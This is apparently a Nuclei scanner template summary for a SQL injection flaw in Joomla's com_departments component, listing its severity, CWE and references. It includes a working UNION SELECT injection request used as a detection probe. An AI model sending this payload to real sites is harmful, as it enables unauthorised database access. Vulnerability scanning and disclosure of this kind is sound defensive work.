# Nuclei Template: Joomla `departments` - SQL Injection
**Template ID:** joomla-department-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`joomla-department-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--
```

## References
- https://github.com/opensec-cn/kunpeng/blob/master/plugin/json/joomla_departments_sqli.json
- https://github.com/w3bd0gs/cocoworker/blob/master/plugins/beebeeto/poc_2014_0170.py
